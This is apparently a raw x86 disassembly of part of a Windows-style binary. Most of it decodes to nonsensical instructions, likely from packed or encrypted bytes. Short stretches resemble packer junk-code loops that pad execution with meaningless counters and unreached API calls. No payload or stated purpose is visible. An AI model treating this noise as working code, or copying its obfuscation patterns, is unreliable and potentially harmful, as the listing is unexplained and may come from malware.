  4190d3:	sbb    BYTE PTR [edx+0x29],0x72
  4190d7:	dec    eax
  4190d8:	sbb    bh,BYTE PTR [edx]
  4190da:	adc    edx,DWORD PTR [ecx+eiz*4+0x2c]
  4190de:	pop    es
  4190df:	sub    dl,BYTE PTR [esi+0x43c2b1f2]
  4190e5:	or     DWORD PTR [ebx-0x67],0xb48f871f
  4190ec:	cmp    al,0x23
  4190ee:	(bad)  
  4190ef:	lods   eax,DWORD PTR ds:[esi]
  4190f0:	push   0x4d62fdcd
  4190f5:	mov    DWORD PTR [edi+0x6],0x7b0e43ba
  4190fc:	scas   eax,DWORD PTR es:[edi]
  4190fd:	inc    edi
  4190fe:	mov    dl,0x8a
  419100:	sti    
  419101:	popf   
  419102:	call   esp
  419104:	arpl   WORD PTR cs:[ecx],si
  419107:	out    0x12,al
  419109:	dec    ebp
  41910a:	mov    ebp,0x5aafec4f
  41910f:	not    DWORD PTR [ecx-0x4274b3c2]
  419115:	arpl   WORD PTR [ecx-0xd],bp
  419118:	sahf   
  419119:	push   esi
  41911a:	scas   eax,DWORD PTR es:[edi]
  41911b:	hlt    
  41911c:	jecxz  0x419145
  41911e:	pop    esi
  41911f:	xchg   esp,eax
  419120:	sub    al,0x12
  419122:	(bad)  
  419123:	jecxz  0x4190e2
  419125:	push   0x7d184e14
  41912a:	jl     0x419165
  41912c:	sbb    bl,ch
  41912e:	int3   
  41912f:	mov    ah,0x27
  419131:	sub    esp,0x4243b94d
  419137:	cmp    dh,BYTE PTR [edx+eax*4+0x6b31d6b1]
  41913e:	dec    ecx
  41913f:	fisubr DWORD PTR [edi]
  419141:	add    al,0x56
  419143:	fisubr WORD PTR [eax+eax*8]
  419146:	into   
  419147:	sbb    al,bh
  419149:	in     eax,0x55
  41914b:	add    DWORD PTR [esi+0x4d],eax
  41914e:	icebp  
  41914f:	push   es
  419150:	cli    
  419151:	lahf   
  419152:	rol    DWORD PTR [esp+eax*4-0x19745ddb],0x9e
  41915a:	pop    ecx
  41915b:	push   edx
  41915c:	sbb    bl,BYTE PTR [ebx]
  41915e:	fcomp  DWORD PTR [ebp-0x4d18b102]
  419164:	hlt    
  419165:	inc    esp
  419166:	gs in  al,dx
  419168:	inc    esp
  419169:	pop    es
  41916a:	mul    al
  41916c:	sar    BYTE PTR [edx-0x5840faf],0x34
  419173:	and    BYTE PTR [eax-0x2f],al
  419176:	enter  0x56b9,0x23
  41917a:	mov    edx,0xbe06bd6c
  41917f:	sar    DWORD PTR [edi-0x302ce064],1
  419185:	mov    al,ds:0x2104611e
  41918a:	call   eax
  41918c:	jmp    0x419194
  419191:	mov    eax,DWORD PTR [ebp+0x10]
  419194:	leave  
  419195:	ret    0xc
  419198:	push   ebp
  419199:	mov    ebp,esp
  41919b:	sub    esp,0x30
  41919e:	jmp    0x4193d3
  4191a3:	rcl    edx,cl
  4191a5:	ret    0xc13e
  4191a8:	into   
  4191a9:	rcl    ecx,cl
  4191ab:	daa    
  4191ac:	jle    0x419228
  4191ae:	mov    ss,WORD PTR [edx+0x83b6dd1]
  4191b4:	lds    edi,FWORD PTR [edi+0x78]
  4191b7:	adc    BYTE PTR [esi+0x78],bh
  4191ba:	js     0x4191b7
  4191bc:	mov    dh,0xb5
  4191be:	cmp    ah,BYTE PTR [ecx+0x50ce69f3]
  4191c4:	inc    edi
  4191c5:	jo     0x4191c9
  4191c7:	out    dx,eax
  4191c8:	pop    ds
  4191c9:	sbb    BYTE PTR [esi-0x71],cl
  4191cc:	or     BYTE PTR [ecx-0x6bdbe7d7],0xf1
  4191d3:	(bad)  
  4191d4:	cs push es
  4191d6:	ret    
  4191d7:	jg     0x419212
  4191d9:	pop    ebp
  4191da:	ficom  WORD PTR [ebx-0x30a2b8f5]
  4191e0:	icebp  
  4191e1:	std    
  4191e2:	bound  ebp,QWORD PTR ds:0x542554cc
  4191e8:	or     eax,DWORD PTR [ebp-0x17c04163]
  4191ee:	or     BYTE PTR [ebx],dl
  4191f0:	pop    eax
  4191f1:	pop    ebx
  4191f2:	sbb    al,0xba
  4191f4:	in     eax,dx
  4191f5:	xlat   BYTE PTR ds:[ebx]
  4191f6:	mov    ebp,0xb9f9b57d
  4191fb:	push   bp
  4191fd:	push   ebp
  4191fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191ff:	jg     0x419272
  419201:	push   ss
  419202:	xchg   cx,ax
  419204:	daa    
  419205:	iret   
  419206:	push   ss
  419207:	xchg   ebp,eax
  419208:	mov    bh,0xb4
  41920a:	mov    ah,0x6f
  41920c:	pop    ss
  41920d:	dec    edi
  41920e:	call   0x4abe:0x76f52bac
  419215:	loopne 0x4191d2
  419217:	sub    al,0x10
  419219:	and    DWORD PTR [ebp+0x577af340],esi
  41921f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419220:	dec    ebx
  419221:	push   esp
  419222:	sti    
  419223:	dec    esi
  419224:	pop    ss
  419225:	mov    ecx,0x63cf0b65
  41922a:	aas    
  41922b:	push   ebp
  41922c:	pop    esp
  41922d:	fistp  WORD PTR [edx]
  41922f:	aas    
  419230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419231:	es jnp 0x419272
  419234:	(bad)
  419237:	xchg   ebp,eax
  419238:	sub    DWORD PTR [edi],eax
  41923a:	imul   esi,eax,0xcfcbadad
  419240:	fadd   DWORD PTR [eax+eax*4]
  419243:	mov    WORD PTR [edx+0x74],ss
  419246:	mov    esi,0xd8e57596
  41924b:	mulps  xmm5,XMMWORD PTR [ebp+0x38]
  41924f:	stos   BYTE PTR es:[edi],al
  419250:	fs dec esp
  419252:	test   eax,0xc856a1b6
  419257:	jmp    0x419279
  419259:	std    
  41925a:	ja     0x419298
  41925c:	jb     0x4192a3
  41925e:	jb     0x4192cf
  419260:	mov    DWORD PTR [ecx+0x14],esi
  419263:	pusha  
  419264:	(bad)
  419267:	lods   eax,DWORD PTR ds:[esi]
  419268:	es aad 0x9e
  41926b:	out    dx,eax
  41926c:	gs push ecx
  41926e:	adc    eax,0xdbb48b8a
  419273:	call   0xbc3867ea
  419278:	xchg   edx,eax
  419279:	(bad)  
  41927a:	jle    0x419221
  41927c:	outs   dx,BYTE PTR ds:[esi]
  41927d:	inc    edx
  41927e:	les    edx,FWORD PTR [edi+ebp*1-0x2db72f11]
  419285:	in     eax,0x81
  419287:	mov    ?,WORD PTR [ecx]
  419289:	in     eax,dx
  41928a:	inc    esi
  41928b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41928c:	cs and al,0x8b
  41928f:	xchg   ebx,eax
  419290:	pop    edi
  419291:	pusha  
  419292:	test   DWORD PTR [esi+0x43],eax
  419295:	fist   DWORD PTR [esi]
  419297:	xchg   ebp,eax
  419298:	lahf   
  419299:	mov    dl,0x8c
  41929b:	gs loopne 0x4192e7
  41929e:	daa    
  41929f:	repnz icebp 
  4192a1:	(bad)  
  4192a2:	fistp  WORD PTR [eax+esi*2]
  4192a5:	adc    bl,BYTE PTR [ebp-0x3]
  4192a8:	pop    ds
  4192a9:	rcl    BYTE PTR [ebp+eax*1+0x18fd9d0f],cl
  4192b0:	adc    eax,0xcf4fa93e
  4192b5:	xlat   BYTE PTR ds:[ebx]
  4192b6:	jle    0x419258
  4192b8:	das    
  4192b9:	pop    edi
  4192ba:	sub    eax,DWORD PTR [ebp-0x62]
  4192bd:	mov    DWORD PTR [ecx],0x9e4f1ce8
  4192c3:	push   ds
  4192c4:	sbb    al,0xcc
  4192c6:	(bad)  
  4192c7:	inc    BYTE PTR [esi]
  4192c9:	lock inc esi
  4192cb:	mov    esp,ebx
  4192cd:	mov    ebp,0xa946bfe9
  4192d2:	lods   al,BYTE PTR ds:[esi]
  4192d3:	sub    eax,0x10283f1c
  4192d8:	fld    QWORD PTR [ecx-0x9d473f2]
  4192de:	lods   al,BYTE PTR ds:[esi]
  4192df:	mov    dl,0xab
  4192e1:	mov    edi,0x940863c9
  4192e6:	leave  
  4192e7:	daa    
  4192e8:	pop    ebp
  4192e9:	loopne 0x419289
  4192eb:	pusha  
  4192ec:	cmp    al,0x13
  4192ee:	fs aas 
  4192f0:	pop    ebx
  4192f1:	cld    
  4192f2:	push   0xffffff84
  4192f4:	aad    0x1d
  4192f6:	(bad)  
  4192f7:	xor    edi,ebx
  4192f9:	loop   0x4192b5
  4192fb:	idiv   ch
  4192fd:	mov    ebp,0x386c897
  419302:	dec    edx
  419303:	xor    al,0xe9
  419305:	ss add dh,al
  419308:	out    dx,al
  419309:	xor    BYTE PTR [ebx+0xe],dh
  41930c:	xor    al,0x7f
  41930e:	mov    cl,BYTE PTR [edi-0x2e]
  419311:	loope  0x4192f5
  419313:	adc    esi,DWORD PTR [edx+0x47]
  419316:	dec    bx
  419318:	inc    edi
  419319:	sti    
  41931a:	imul   esi,DWORD PTR [edx-0x7cb4d48],0x72
  419321:	into   
  419322:	stos   BYTE PTR es:[edi],al
  419323:	outs   dx,DWORD PTR ds:[esi]
  419324:	out    0x4e,al
  419326:	mov    ah,0xfb
  419328:	pusha  
  419329:	in     eax,dx
  41932a:	or     eax,eax
  41932c:	xchg   ebp,eax
  41932d:	jg     0x41933b
  41932f:	jge    0x4192bd
  419331:	xor    ch,BYTE PTR [ebp+0x622950e6]
  419337:	dec    ebp
  419338:	(bad)  
  41933a:	aad    0xa
  41933c:	jecxz  0x419326
  41933e:	fwait
  41933f:	push   ss
  419340:	dec    edx
  419341:	or     edi,DWORD PTR ds:0xec14
  419346:	inc    esi
  419347:	sbb    BYTE PTR [esi-0x5f1fdff8],ch
  41934d:	icebp  
  41934e:	push   es
  41934f:	iret   
  419350:	cmp    eax,0x5d20597b
  419355:	push   ebp
  419356:	sti    
  419357:	jno    0x4193af
  419359:	pop    ebp
  41935a:	retf   0xa87
  41935d:	ss mov cl,0x7f
  419360:	push   esp
  419361:	and    DWORD PTR [edi+0x38f54c15],ebx
  419367:	mov    ch,dl
  419369:	xchg   esp,eax
  41936a:	xchg   ecx,eax
  41936b:	inc    edi
  41936c:	hlt    
  41936d:	mov    esi,0x48f9e825
  419372:	outs   dx,BYTE PTR ds:[esi]
  419373:	inc    esp
  419374:	loopne 0x4193b0
  419376:	jno    0x419353
  419378:	nop
  419379:	cdq    
  41937a:	sahf   
  41937b:	dec    eax
  41937c:	out    0x61,al
  41937e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41937f:	mov    ds:0x1342c195,eax
  419384:	inc    esi
  419385:	xor    ch,BYTE PTR [edx]
  419387:	fimul  DWORD PTR [edx]
  419389:	sbb    ah,BYTE PTR [ebx-0x63]
  41938c:	jno    0x4193a0
  41938e:	push   edi
  41938f:	pop    edi
  419390:	(bad)  
  419392:	js     0x419335
  419394:	mov    ebx,0x6688d4ca
  419399:	pop    ecx
  41939a:	jl     0x41937b
  41939c:	push   si
  41939e:	imul   DWORD PTR [ebp-0x266b4001]
  4193a4:	dec    DWORD PTR [esi-0x176cd085]
  4193aa:	mov    al,0xf
  4193ac:	xor    al,0xd8
  4193ae:	or     al,0xbe
  4193b0:	es ja  0x419371
  4193b3:	ss scas al,BYTE PTR es:[edi]
  4193b5:	mov    BYTE PTR [edx],0x5b
  4193b8:	pop    esp
  4193b9:	push   ebx
  4193ba:	push   0xdca84923
  4193bf:	mov    esp,0x1d6aad06
  4193c4:	jmp    0x41938b
  4193c6:	clc    
  4193c7:	dec    ebp
  4193c8:	shr    DWORD PTR [edx+0x46],0xa7
  4193cc:	add    BYTE PTR [eax+0x3c9f330e],dh
  4193d2:	mov    DWORD PTR cs:[ebp-0x4],0xf89c8538
  4193da:	and    DWORD PTR ds:0x42a89d,0x0
  4193e4:	xor    ecx,ecx
  4193e6:	add    ecx,DWORD PTR ds:0x42a89d
  4193ec:	inc    ecx
  4193ed:	mov    DWORD PTR ds:0x42a89d,ecx
  4193f3:	cmp    DWORD PTR ds:0x42a89d,0x24
  4193fa:	jne    0x41940b
  419400:	push   0x4f45
  419405:	call   DWORD PTR ds:0x41d278
  41940b:	cmp    DWORD PTR ds:0x42a89d,0x1b
  419412:	jb     0x4193e4
  419418:	and    DWORD PTR ds:0x42a821,0x0
  419422:	jmp    0x419434
  419427:	mov    ecx,DWORD PTR ds:0x42a821
  41942d:	inc    ecx
  41942e:	mov    DWORD PTR ds:0x42a821,ecx
  419434:	cmp    DWORD PTR ds:0x42a821,0x1d
  41943b:	jae    0x419470
  419441:	cmp    DWORD PTR ds:0x42a821,0x1e
  419448:	jne    0x419461
  41944e:	push   0x42a9af
  419453:	push   DWORD PTR [ebp-0x20]
  419456:	push   0x1
  419458:	push   DWORD PTR [ebp-0xc]
  41945b:	call   DWORD PTR ds:0x41d118
  419461:	jmp    0x419427
  419466:	adc    DWORD PTR ds:0x42a7d1,0x7c2
  419470:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  419477:	and    DWORD PTR ds:0x42a82d,0x0
  419481:	mov    ecx,DWORD PTR ds:0x42a82d
  419487:	inc    ecx
  419488:	mov    DWORD PTR ds:0x42a82d,ecx
  41948e:	cmp    DWORD PTR ds:0x42a82d,0x25
  419495:	jne    0x4194a6
  41949b:	push   0x42aa68
  4194a0:	call   DWORD PTR ds:0x41d27c
  4194a6:	cmp    DWORD PTR ds:0x42a82d,0x18
  4194ad:	jb     0x419481
  4194b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4194b6:	mov    eax,ds:0x42a825
  4194bb:	and    DWORD PTR ds:0x42a795,eax
  4194c1:	push   ebx
  4194c2:	add    ebx,ebx
  4194c4:	mov    eax,0x7510850
  4194c9:	and    DWORD PTR ds:0x42a78d,ecx
  4194cf:	xor    ecx,eax
  4194d1:	movzx  ebx,BYTE PTR ds:0x42a799
  4194d8:	adc    DWORD PTR ds:0x42a891,ebx
  4194de:	mov    ebx,0x327298
  4194e3:	adc    DWORD PTR ds:0x42a781,0x50ad
  4194ed:	add    ecx,ebx
  4194ef:	inc    DWORD PTR ds:0x42a89d
  4194f5:	mov    DWORD PTR [ebp-0x1c],ecx
  4194f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4194fb:	push   esi
  4194fc:	mov    DWORD PTR ds:0x42a815,0x238f
  419506:	push   edi
  419507:	test   ecx,ecx
  419509:	mov    DWORD PTR ds:0x42a859,0x1f7e
  419513:	je     0x419758
  419519:	jmp    0x41974e
  41951e:	retf   0xd03c
  419521:	(bad)
  419524:	fld    st(3)
  419526:	scas   eax,DWORD PTR es:[edi]
  419527:	inc    eax
  419528:	adc    DWORD PTR [esi-0x7e],eax
  41952b:	sbb    al,0x1f
  41952d:	push   0x20
  41952f:	retf   
  419530:	jg     0x4195aa
  419532:	adc    BYTE PTR [esi+0x78],bh
  419535:	js     0x419533
  419537:	pop    es
  419538:	mov    eax,ds:0x172683e6
  41953d:	mov    esp,0xc20e1792
  419542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419543:	pop    ebx
  419544:	jno    0x419510
  419546:	xchg   ebp,eax
  419547:	dec    edx
  419548:	rcl    DWORD PTR [esi-0x188d766c],cl
  41954e:	xor    BYTE PTR [edi-0x1],ch
  419551:	mov    al,ds:0x519b8644
  419556:	dec    ecx
  419557:	es jg  0x41952b
  41955a:	cwde   
  41955b:	pop    eax
  41955c:	ret    0x8e36
  41955f:	push   esp
  419560:	stc    
  419561:	sub    dh,BYTE PTR [edx-0x3ec53589]
  419567:	outs   dx,BYTE PTR ds:[esi]
  419568:	push   edx
  419569:	sub    eax,0x2bba5b79
  41956e:	mov    dh,0x98
  419570:	push   edi
  419571:	aaa    
  419572:	xchg   ebx,eax
  419573:	or     cl,BYTE PTR ds:[eax]
  419576:	sbb    cl,cl
  419578:	pop    eax
  419579:	ins    BYTE PTR es:[edi],dx
  41957a:	out    dx,eax
  41957b:	push   cs
  41957c:	xchg   esi,eax
  41957d:	add    al,0x7f
  41957f:	sub    BYTE PTR [edi+0x24e40997],bl
  419585:	adc    bl,BYTE PTR ds:0xc93d205d
  41958b:	(bad)  
  41958c:	mov    eax,0xc516add1
  419591:	pop    ebp
  419592:	xor    ebp,eax
  419594:	mov    al,0xdb
  419596:	test   DWORD PTR [eax],esi
  419598:	retf   0x4347
  41959b:	jbe    0x419588
  41959d:	and    al,0xa0
  41959f:	jmp    0xa0a:0x83bd6025
  4195a6:	cmp    al,ch
  4195a8:	sbb    edi,DWORD PTR [ebp+0x135b6b29]
  4195ae:	cmp    DWORD PTR [esi+0x44],edx
  4195b1:	(bad)  
  4195b3:	les    ecx,FWORD PTR [esi-0x42a832b0]
  4195b9:	jg     0x41959b
  4195bb:	cmp    bh,BYTE PTR [eax+eax*8-0x34]
  4195bf:	(bad)  
  4195c0:	outs   dx,DWORD PTR ss:[esi]
  4195c2:	les    ebp,FWORD PTR [edi-0x5a]
  4195c5:	sub    eax,0xc230aac2
  4195ca:	push   edx
  4195cb:	mov    eax,0x5f131659
  4195d0:	outs   dx,BYTE PTR ds:[esi]
  4195d1:	push   edx
  4195d2:	dec    ecx
  4195d3:	ja     0x4195d3
  4195d5:	xor    al,0xcf
  4195d7:	cwde   
  4195d8:	push   ds
  4195d9:	std    
  4195da:	popf   
  4195db:	mov    esi,0x581f60bf
  4195e0:	mov    bh,BYTE PTR [edi+0x79]
  4195e3:	add    eax,0xc642fc2f
  4195e8:	push   ds
  4195e9:	xchg   edx,eax
  4195ea:	xchg   ebx,eax
  4195eb:	bound  ebx,QWORD PTR ds:0x2e23e51c
  4195f1:	xchg   ebp,eax
  4195f2:	test   BYTE PTR [eax-0x36c0e3aa],ch
  4195f8:	sub    BYTE PTR [ebx+0x45f7b4fb],dh
  4195fe:	pop    ds
  4195ff:	mov    esp,0x98f203ee
  419604:	out    dx,eax
  419605:	mov    esi,0xe7e8c10
  41960a:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41960c:	sbb    ebp,ebp
  41960e:	lods   eax,DWORD PTR ds:[esi]
  41960f:	pop    ds
  419610:	aam    0x1d
  419612:	xor    eax,0xc6949cc5
  419617:	pop    esp
  419618:	outs   dx,DWORD PTR ds:[esi]
  419619:	xchg   DWORD PTR [ebx-0x5e],edx
  41961c:	aaa    
  41961d:	adc    al,0xd2
  41961f:	cmp    al,0x89
  419621:	push   ebp
  419622:	ficomp DWORD PTR [edi+0x24112319]
  419628:	out    0x76,eax
  41962a:	data16 loope 0x419626
  41962d:	xor    BYTE PTR [ebp-0x75bb7e00],bh
  419633:	cli    
  419634:	adc    edx,DWORD PTR [eax-0x132c85d6]
  41963a:	and    BYTE PTR [edi],bl
  41963c:	and    eax,0xd48df977
  419641:	in     al,0xce
  419643:	pop    esi
  419644:	mov    al,ds:0x588bfc08
  419649:	xchg   ebp,eax
  41964a:	es xchg esp,eax
  41964c:	fiadd  DWORD PTR [esi+0x51a70b9a]
  419652:	or     al,dh
  419654:	xchg   edi,eax
  419655:	mov    ebp,0xd5f9b99c
  41965a:	sbb    DWORD PTR ds:0xa6bac6b7,edi
  419660:	rcr    DWORD PTR [edi+edx*1],cl
  419663:	mov    bl,BYTE PTR [ecx-0x62]
  419666:	fwait
  419667:	and    dl,BYTE PTR [edx+0xf66ec3]
  41966d:	cmp    dh,dl
  41966f:	adc    ecx,ecx
  419671:	and    bh,BYTE PTR [edi]
  419673:	adc    al,0xc0
  419675:	lock push edx
  419677:	retf   
  419678:	jl     0x419687
  41967a:	add    ecx,DWORD PTR [eax+0x361e5841]
  419680:	cwde   
  419681:	mov    edi,0xf8dc6fa3
  419686:	mov    ebx,0x390a6ab9
  41968b:	pop    es
  41968c:	test   al,0xb1
  41968e:	sbb    bh,ah
  419690:	jmp    0x4196dd
  419692:	xchg   ecx,eax
  419693:	push   ecx
  419694:	push   edx
  419695:	sub    eax,0x68f5a6b4
  41969a:	jp     0x419696
  41969c:	inc    esp
  41969d:	enter  0xb4c2,0x3e
  4196a1:	test   BYTE PTR [esi],al
  4196a3:	mov    WORD PTR [esi+0x2f],?
  4196a6:	fistp  DWORD PTR ds:0x45ff4ebd
  4196ac:	ret    0xddae
  4196af:	sub    edi,esi
  4196b1:	sahf   
  4196b2:	sub    eax,0x308ea1da
  4196b7:	je     0x4196b4
  4196b9:	mov    eax,ds:0x1b9215d
  4196be:	mov    dl,0xf9
  4196c0:	jmp    0x982c:0x77508d21
  4196c7:	push   ds
  4196c8:	mov    dl,0x3a
  4196ca:	dec    DWORD PTR [eax-0x6e]
  4196cd:	add    al,0xb7
  4196cf:	test   eax,0x3b311b1d
  4196d4:	enter  0x35ab,0xf
  4196d8:	dec    esp
  4196d9:	inc    ebp
  4196da:	adc    dl,BYTE PTR [edx]
  4196dc:	imul   esi,DWORD PTR [esi+0x1b],0x30c9a00e
  4196e3:	push   0x6144bf25
  4196e8:	xchg   esp,eax
  4196e9:	adc    DWORD PTR [ecx-0x414cb3f2],0x68b0bad6
  4196f3:	aad    0x64
  4196f5:	push   edx
  4196f6:	pusha  
  4196f7:	add    eax,0x41f717ae
  4196fc:	inc    edx
  4196fd:	pop    esi
  4196fe:	arpl   sp,si
  419700:	push   edx
  419701:	icebp  
  419702:	out    dx,eax
  419703:	mov    WORD PTR [edi+ecx*8],ss
  419706:	lahf   
  419707:	pop    esp
  419708:	loopne 0x4196b4
  41970a:	jmp    0x5a9ec04
  41970f:	in     al,dx
  419710:	mov    edx,0x21db091b
  419715:	jb     0x419729
  419717:	and    bh,BYTE PTR ss:[edi+0x1a]
  41971b:	push   esi
  41971c:	aam    0xa0
  41971e:	or     eax,0xabfcf706
  419723:	mov    edx,0xb905efc3
  419728:	xor    eax,0x8541e4b3
  41972d:	push   cs
  41972e:	ja     0x419744
  419730:	xor    DWORD PTR [eax-0x47],ecx
  419733:	test   al,0x84
  419735:	push   cs
  419736:	scas   al,BYTE PTR es:[edi]
  419737:	mov    dh,0xae
  419739:	retf   
  41973a:	and    DWORD PTR [ecx-0x6d5b0746],esp
  419740:	data16 mov ds:0xc296a8de,al
  419746:	and    ecx,ecx
  419748:	cld    
  419749:	jo     0x419758
  41974b:	fmul   st(3),st
  41974d:	mov    dl,0x8b
  41974f:	dec    ebp
  419750:	adc    al,0x3
  419752:	test   BYTE PTR [ebx-0x1bb276f7],0xf
  419759:	scas   eax,DWORD PTR es:[edi]
  41975a:	shl    BYTE PTR [ebx],1
  41975c:	cmp    eax,0x42a821
  419761:	mov    ecx,0x4573
  419766:	add    edx,ecx
  419768:	sub    DWORD PTR ds:0x42a89d,ecx
  41976e:	mov    esi,0x7879
  419773:	mov    edi,0x1556
  419778:	not    DWORD PTR ds:0x42a865
  41977e:	xchg   esi,ecx
  419780:	add    DWORD PTR ds:0x42a7d5,0x585c
  41978a:	jmp    0x4199bf
  41978f:	iret   
  419790:	iret   
  419791:	(bad)  
  419792:	xlat   BYTE PTR ds:[ebx]
  419793:	(bad)  
  419794:	xlat   BYTE PTR ds:[ebx]
  419795:	iret   
  419796:	xlat   BYTE PTR ds:[ebx]
  419797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419798:	call   0xf170ddeb
  41979d:	push   edx
  41979e:	data16 cmp cl,cl
  4197a1:	jg     0x41981b
  4197a3:	adc    BYTE PTR [esi+0x78],bh
  4197a6:	js     0x4197fe
  4197a8:	sub    eax,0x197f06c2
  4197ad:	mov    dl,0x65
  4197af:	sti    
  4197b0:	jge    0x4197fa
  4197b2:	stc    
  4197b3:	sub    ch,BYTE PTR [esi-0x50c68557]
  4197b9:	jns    0x41980a
  4197bb:	bound  eax,QWORD PTR [ebx+esi*8-0x4a2513fe]
  4197c2:	scas   eax,DWORD PTR es:[edi]
  4197c3:	ins    BYTE PTR es:[edi],dx
  4197c4:	neg    BYTE PTR [ecx+0x66a4e0e1]
  4197ca:	fcmovnbe st,st(1)
  4197cc:	es cmc 
  4197ce:	js     0x419795
  4197d0:	fist   DWORD PTR [edx]
  4197d2:	or     DWORD PTR [edx+0x7c],esp
  4197d5:	fcomp  QWORD PTR [eax-0x1a76a41d]
  4197db:	adc    eax,0xde9f7990
  4197e0:	mov    eax,ds:0xb6029928
  4197e5:	retf   
  4197e6:	mov    ds:0xfda4c713,eax
  4197eb:	mov    bl,0x91
  4197ed:	and    al,0x4d
  4197ef:	mov    WORD PTR [ecx+ebx*8+0x2874b2e6],?
  4197f6:	adc    dl,BYTE PTR [esi]
  4197f8:	jmp    0x23a6:0x34da934
  4197ff:	sbb    al,0x35
  419801:	into   
  419802:	sbb    dl,ah
  419804:	fwait
  419805:	mov    bh,0x59
  419807:	iret   
  419808:	(bad)  
  419809:	and    eax,0x2ecd8f1f
  41980e:	sub    al,0xe3
  419810:	rcr    DWORD PTR [ebp+0x42d8ab06],cl
  419816:	fs pop eax
  419818:	jle    0x4197de
  41981a:	cld    
  41981b:	nop    DWORD PTR [edi+0x214386ee]
  419822:	aas    
  419823:	ror    DWORD PTR [ebx-0x22cb1ffa],0x95
  41982a:	out    0x27,eax
  41982c:	js     0x4197bf
  41982e:	sbb    al,0xda
  419830:	jge    0x41981f
  419832:	adc    edi,ecx
  419834:	repz xchg esi,eax
  419836:	jbe    0x419822
  419838:	dec    eax
  419839:	jmp    0xe1ea:0x44a07499
  419840:	call   0x1a2d:0x78357bcc
  419847:	cmp    eax,0xb3b10dac
  41984c:	xor    al,0xf9
  41984e:	test   eax,0x412d3f61
  419853:	fcom   DWORD PTR [ebx-0x6701be92]
  419859:	(bad)  
  41985a:	fldcw  WORD PTR [esp+ebp*2+0x17]
  41985e:	fwait
  41985f:	push   ds
  419860:	mov    cl,0xec
  419862:	inc    eax
  419863:	cmp    BYTE PTR [eax],al
  419865:	mov    fs,esi
  419867:	sbb    dh,bh
  419869:	adc    ch,BYTE PTR ds:[esi]
  41986c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41986d:	add    BYTE PTR [ecx+ebp*1-0x2167940e],0x51
  419875:	aaa    
  419876:	sub    BYTE PTR [ebx+edi*8+0x1b0f11c6],bl
  41987d:	push   edi
  41987e:	outs   dx,BYTE PTR ds:[esi]
  41987f:	loopne 0x419897
  419881:	add    al,0xe9
  419883:	jmp    0x70f35d28
  419888:	sbb    esi,DWORD PTR [ecx+0x207440c3]
  41988e:	inc    edx
  41988f:	sub    esi,DWORD PTR [ebx-0x1b041c74]
  419895:	mov    ds:0xcad6419f,eax
  41989a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41989b:	aas    
  41989c:	loope  0x4198d0
  41989e:	inc    ebp
  41989f:	mov    bh,0x3a
  4198a1:	or     eax,0xee1af29f
  4198a6:	push   0x7a00fc85
  4198ab:	test   BYTE PTR [ecx-0x10],bl
  4198ae:	es sti 
  4198b0:	mov    edi,0x9ffb3191
  4198b5:	(bad)  
  4198b6:	mov    ch,0xc1
  4198b8:	fsub   QWORD PTR [ecx+0x53]
  4198bb:	push   esi
  4198bc:	sbb    al,0xe2
  4198be:	imul   edx,DWORD PTR [eax],0xdcbcdfba
  4198c4:	nop
  4198c5:	stc    
  4198c6:	or     al,0x4b
  4198c8:	leave  
  4198c9:	mov    ebx,0x49398f0
  4198ce:	(bad)  
  4198cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198d0:	in     eax,0x59
  4198d2:	add    DWORD PTR [edx+edi*4+0x4e53ad50],esi
  4198d9:	jb     0x4198be
  4198db:	je     0x419953
  4198dd:	shr    DWORD PTR [edx-0x3],0x1a
  4198e1:	rol    edx,1
  4198e3:	adc    eax,0xb15569de
  4198e8:	cld    
  4198e9:	lahf   
  4198ea:	pusha  
  4198eb:	mov    BYTE PTR [ebx+0x4c891ec1],cl
  4198f1:	in     eax,0x19
  4198f3:	shl    BYTE PTR cs:[eax+0x51],1
  4198f7:	jo     0x4198cf
  4198f9:	fild   QWORD PTR [ecx]
  4198fb:	out    dx,al
  4198fc:	in     al,dx
  4198fd:	popf   
  4198fe:	outs   dx,DWORD PTR ds:[esi]
  4198ff:	push   es
  419900:	pop    esp
  419901:	lds    esp,FWORD PTR gs:[ecx]
  419904:	fwait
  419905:	je     0x4198ed
  419907:	xlat   BYTE PTR ds:[ebx]
  419908:	fidiv  DWORD PTR [ebx+0x16]
  41990b:	scas   eax,DWORD PTR es:[edi]
  41990c:	ror    esp,cl
  41990e:	icebp  
  41990f:	adc    al,0x30
  419911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419912:	ds enter 0xa934,0x4e
  419917:	add    al,0x49
  419919:	mov    dl,0x21
  41991b:	mov    ah,0x59
  41991e:	jmp    0x4198e9
  419920:	fsub   st,st(4)
  419922:	mov    eax,0x575f5c75
  419927:	loop   0x419942
  419929:	(bad)  
  41992a:	pop    ebx
  41992b:	dec    ebp
  41992c:	into   
  41992d:	jl     0x419940
  41992f:	mov    bl,BYTE PTR [ebx+0xe]
  419932:	retf   0x7c72
  419935:	int3   
  419936:	mov    cl,0x9e
  419938:	adc    ebp,DWORD PTR [eax]
  41993a:	pop    ecx
  41993b:	and    al,BYTE PTR [edx]
  41993d:	mov    ecx,ebp
  41993f:	popa   
  419940:	pop    esp
  419941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419942:	jecxz  0x4198f4
  419944:	and    DWORD PTR [edi+0x43486f62],0xb53c1d4a
  41994e:	fwait
  41994f:	adc    ecx,DWORD PTR [eax-0x3c088dd8]
  419955:	shr    DWORD PTR [eax+0x44],1
  419958:	ret    0xbf46
  41995b:	fiadd  DWORD PTR [ecx+0x8bcfb8b]
  419961:	inc    ecx
  419962:	add    ecx,DWORD PTR es:[eax+0x56]
  419966:	jns    0x4199d8
  419968:	add    DWORD PTR [edx+0x2e448196],0x18076204
  419972:	mov    ebx,cs
  419974:	daa    
  419975:	fstp   TBYTE PTR [ebx+0x2a382ae0]
